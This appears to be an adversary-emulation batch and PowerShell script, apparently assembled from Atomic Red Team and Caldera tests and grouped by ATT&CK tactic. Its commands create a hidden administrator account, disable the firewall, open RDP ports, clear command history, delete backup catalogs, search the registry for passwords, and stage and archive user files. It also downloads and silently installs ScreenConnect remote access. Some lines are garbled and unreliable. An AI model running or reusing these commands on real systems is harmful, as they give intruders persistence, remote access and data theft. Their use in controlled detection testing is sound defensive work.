@echo Off
ECHO Collection
C reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f && reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f
powershell.exe -ExecutionPolicy Bypass -C "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object"
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c "Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log"
powershell.exe -ExecutionPolicy Bypass -C "Get-ChildItem C:\Users -Attributes Directory+Hidden -ErrorAction SilentlyContinue -Filter \".git\" -Recurse | foreach {$_.parent.FullName} | Select-Object; exit 0;"
powershell.exe -ExecutionPolicy Bypass -C "wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log"
powershell.exe -ExecutionPolicy Bypass -C "Copy-Item C:\Program````````````````````````.........::S:Stri::String C:\Users\Administrator\staged"
start ms-settings:
cmd.exe /C reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f && reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f
powershell.exe -ExecutionPolicy Bypass -C "New-Item -Path $env:TEMP\T1119_powershell_collection -ItemType Directory -Force | Out-Null; Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\T1119_powershell_collection}"
powershell.exe -ExecutionPolicy Bypass -C "dir $env:USERPROFILE -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\T1560-data-ps.zip"

@echo Off
ECHO Credential Access
C:\Windows\system32\reg.exe query HKCU /f password /t REG_SZ /s
start C:\Users

@echo Off
ECHO Defense Evasion
hh.exe 9e2e6f_T1218.001.chm
icacls "C:\Users\Public\*" /grant Everyone:F /T /C /Q
cmd.exe /C NET USER AtomicOperator$ At0micRedTeam! /ADD /expires:never && REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v AtomicOperator$ /t REG_DWORD /d 0
attrib.exe +h %temp%\T1564.001.txt
start notepad
powershell.exe -ExecutionPolicy Bypass -C Clear-History;Clear 
powershell.exe -ExecutionPolicy Bypass -C "Remove-Item (Get-PSReadlineOption).HistorySavePath"
odbcconf.exe /S /A {REGSVR "C:\Users\Public\sandcat.dll"}
NET USER AtomicOperator$ At0micRedTeam! /ADD /expires:never 
reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" /v EnableFirewall /t REG_DWORD /d 0 /f
C:\Windows\system32\netsh.exe advfirewall firewall add rule "name=Open Port to Any" dir=in protocol=tcp localport=3389 action=allow profile=any

@echo Off
ECHO Discovery
whoami
$env:username
powershell.exe -ExecutionPolicy Bypass -C "Get-Service > $env:TEMP\T1119_1.txt; Get-ChildItem Env: > $env:TEMP\T1119_2.txt; Get-Process > $env:TEMP\T1119_3.txt"
cmd.exe /C net.exe start >> C:\Windows\Temp\service-list.txt 
powershell.exe -ExecutionPolicy Bypass -C "$ps_url = \"https://download.sysinternals.com/files/PSTools.zip\";$download_folder = \"C:\Users\Public\\\";$staging_folder = \"C:\Users\Public\temp\";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder\"PSTools.zip\" -DestinationPath $staging_folder;iex $staging_folder\"\pslist.exe\" >> $env:LOCALAPPDATA\output.log;Remove-Item $download_folder\"PSTools.zip\";Remove-Item $staging_folder -Recurse" 
cmd.exe /C dir /s /b %USERPROFILE%\Favorites
powershell.exe -ExecutionPolicy Bypass -C "Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\T1120_collection.txt; $Space,$Heading,$Break,$Data = Get-Content $env:TEMP\T1120_collection.txt; @($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne \"\" } |Set-Content $env:TEMP\T1120_collection.txt"
powershell.exe -ExecutionPolicy Bypass -C "net accounts"
powershell.exe -ExecutionPolicy Bypass -C "Import-Module .\powerview.ps1;Get-DomainComputer"
powershell.exe -ExecutionPolicy Bypass -C "arp -a"
powershell.exe -ExecutionPolicy Bypass -C ".\wifi.ps1 -Pref"
netsh advfirewall firewall show rule name=all
powershell.exe -ExecutionPolicy Bypass -C "Import-Module .\powerview.ps1 -Force;Get-NetDomain | ConvertTo-Json -Depth 1"
powershell.exe -ExecutionPolicy Bypass -C "echo $(get-uac)"
powershell.exe -ExecutionPolicy Bypass -C "netstat -anto;Get-NetTCPConnection"
ping 127.0.0.1

@echo Off
ECHO Execution
echo "hello"
start powershell.exe -ArgumentList "-NoP","-StA","-ExecutionPolicy","bypass",".\Emulate-Administrator-Tasks.ps1"
Start notepad ".\filename.txt"
start chrome
ping 127.0.0.1
echo "hello_end"

@echo Off
ECHO Impact
taskkill.exe /f /im spoolsv.exe
powershell.exe -ExecutionPolicy Bypass -C ".\wifi.ps1 -Off" 
cmd.exe /C wbadmin delete catalog -quiet
calc
start notepad
start chrome
New-Item -Type Directory "PathToAtomicsFolder\T1137.006\bin\Addins\" -Force | Out-Null
Invoke-Webrequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x64.xll" -UseBasicParsing -OutFile "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"
Invoke-Webrequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x86.xll" -UseBasicParsing -OutFile "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll"


@echo Off
ECHO Lateral Movement
cmd.exe /C reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 4489 -f && netsh advfirewall firewall add rule name="RDPPORTLatest-TCP-In" dir=in action=allow protocol=TCP localport=4489

@echo Off
ECHO Persistance
Get-LocalUser
$Password = Read-Host -AsSecureString
New-LocalUser "Attacksim" -Password $Password -FullName "AttackSimulation" -Description "SMAK"
Get-LocalUser
cmd.exe /C reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d "C:\Path\AtomicRedTeam.dll"
cmd.exe /C reg.exe add HKCU\Software\Microsoft\Office\16.0\Outlook\WebView\Inbox /v URL /t REG_SZ /d file://d43bfc_T1137.004.html /f 
$extList = "fcfhplploccackoneaefokcmbjfbkenj", "fdcgdnkidjaadafnichfpabhfomcebme"
foreach ($extension in $extList) {New-Item -Path HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension -Force; New-ItemProperty -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -Name "update_url" -Value "https://clients2.google.com/service/update2/crx" -PropertyType "String" -Force}
Start chrome
Start-Sleep -Seconds 30
Stop-Process -Name "chrome"	
$extList = "fcfhplploccackoneaefokcmbjfbkenj", "fdcgdnkidjaadafnichfpabhfomcebme"
foreach ($extension in $extList) {
Remove-Item -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -ErrorAction Ignore}
start cmd.exe


@echo Off
ECHO Random
hh.exe 9e2e6f_T1218.001.chm
icacls "C:\Users\Public\*" /grant Everyone:F /T /C /Q
cmd.exe /C NET USER AtomicOperator$ At0micRedTeam! /ADD /expires:never && REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v AtomicOperator$ /t REG_DWORD /d 0
attrib.exe +h %temp%\T1564.001.txt
powershell.exe -ExecutionPolicy Bypass -C Clear-History;Clear 
powershell.exe -ExecutionPolicy Bypass -C "Remove-Item (Get-PSReadlineOption).HistorySavePath"
odbcconf.exe /S /A {REGSVR "C:\Users\Public\sandcat.dll"}
NET USER AtomicOperator$ At0micRedTeam! /ADD /expires:never 
reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" /v EnableFirewall /t REG_DWORD /d 0 /f
C:\Windows\system32\netsh.exe advfirewall firewall add rule "name=Open Port to Any" dir=in protocol=tcp localport=3389 action=allow profile=any
start powershell.exe -ArgumentList "-NoP","-StA","-ExecutionPolicy","bypass",".\Emulate-Administrator-Tasks.ps1"
cmd.exe /C reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d "C:\Path\AtomicRedTeam.dll"
cmd.exe /C reg.exe add HKCU\Software\Microsoft\Office\16.0\Outlook\WebView\Inbox /v URL /t REG_SZ /d file://d43bfc_T1137.004.html /f 
cmd.exe /C reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f && reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f
powershell.exe -ExecutionPolicy Bypass -C "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object"
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c "Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log"
powershell.exe -ExecutionPolicy Bypass -C "Get-ChildItem C:\Users -Attributes Directory+Hidden -ErrorAction SilentlyContinue -Filter \".git\" -Recurse | foreach {$_.parent.FullName} | Select-Object; exit 0;"
powershell.exe -ExecutionPolicy Bypass -C "wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log"
powershell.exe -ExecutionPolicy Bypass -C "Copy-Item C:\Program````````````````````````.........::S:Stri::String C:\Users\Administrator\staged"
cmd.exe /C reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f && reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f
powershell.exe -ExecutionPolicy Bypass -C "New-Item -Path $env:TEMP\T1119_powershell_collection -ItemType Directory -Force | Out-Null; Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\T1119_powershell_collection}"
powershell.exe -ExecutionPolicy Bypass -C "dir $env:USERPROFILE -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\T1560-data-ps.zip"
cmd.exe /C reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 4489 -f && netsh advfirewall firewall add rule name="RDPPORTLatest-TCP-In" dir=in action=allow protocol=TCP localport=4489
whoami
$env:username
powershell.exe -ExecutionPolicy Bypass -C "Get-Service > $env:TEMP\T1119_1.txt; Get-ChildItem Env: > $env:TEMP\T1119_2.txt; Get-Process > $env:TEMP\T1119_3.txt"
cmd.exe /C net.exe start >> C:\Windows\Temp\service-list.txt 
powershell.exe -ExecutionPolicy Bypass -C "$ps_url = \"https://download.sysinternals.com/files/PSTools.zip\";$download_folder = \"C:\Users\Public\\\";$staging_folder = \"C:\Users\Public\temp\";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder\"PSTools.zip\" -DestinationPath $staging_folder;iex $staging_folder\"\pslist.exe\" >> $env:LOCALAPPDATA\output.log;Remove-Item $download_folder\"PSTools.zip\";Remove-Item $staging_folder -Recurse" 
cmd.exe /C dir /s /b %USERPROFILE%\Favorites
powershell.exe -ExecutionPolicy Bypass -C "Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\T1120_collection.txt; $Space,$Heading,$Break,$Data = Get-Content $env:TEMP\T1120_collection.txt; @($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne \"\" } |Set-Content $env:TEMP\T1120_collection.txt"
powershell.exe -ExecutionPolicy Bypass -C "net accounts"
powershell.exe -ExecutionPolicy Bypass -C "Import-Module .\powerview.ps1;Get-DomainComputer"
powershell.exe -ExecutionPolicy Bypass -C "arp -a"
powershell.exe -ExecutionPolicy Bypass -C ".\wifi.ps1 -Pref"
netsh advfirewall firewall show rule name=all
powershell.exe -ExecutionPolicy Bypass -C "Import-Module .\powerview.ps1 -Force;Get-NetDomain | ConvertTo-Json -Depth 1"
powershell.exe -ExecutionPolicy Bypass -C "echo $(get-uac)"
powershell.exe -ExecutionPolicy Bypass -C "netstat -anto;Get-NetTCPConnection"
powershell.exe -ExecutionPolicy Bypass -C "netsh interface portproxy add v4tov4 listenport=1337 connectport=1337 connectaddress=127.0.0.1"
$installer = "C:\Users\$env:username\Downloads\ScreenConnect.msi"; Invoke-WebRequest -OutFile $installer "https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi"; msiexec /i $installer /qn
taskkill.exe /f /im spoolsv.exe
powershell.exe -ExecutionPolicy Bypass -C ".\wifi.ps1 -Off" 
cmd.exe /C wbadmin delete catalog -quiet
C:\Windows\system32\reg.exe query HKCU /f password /t REG_SZ /s
